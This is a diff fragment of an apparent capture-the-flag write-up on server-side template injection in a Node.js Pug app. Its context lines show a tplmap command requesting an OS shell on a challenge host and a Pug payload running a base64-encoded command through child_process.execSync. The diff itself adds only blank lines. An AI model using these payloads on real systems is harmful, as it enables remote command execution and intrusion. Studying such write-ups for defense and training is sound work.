@@ -43,6 +43,7 @@ app.listen(3000, () => console.log(':3000'));
 
 ```
 :::
+
 ## Exploit - `tqlmap`
 ```bash!
 $ ./tplmap.py --engine pug --os-shell -u "http://h4ck3r.quest:8008/?name=bob"
@@ -71,6 +72,7 @@ You must let the template by like:
     = global.process.mainModule.require('child_process').execSync(Buffer('bHM=',+'base64').toString())
     ```
 * Note that `bHM=` is command `ls` in base64 format
+
 ## Reference
 [关于SSTI注入的二三事](https://xz.aliyun.com/t/11090)
 [【SSTI模块注入】SSTI+Flask+Python（下）：绕过过滤](https://blog.51cto.com/u_15414689/5530904)
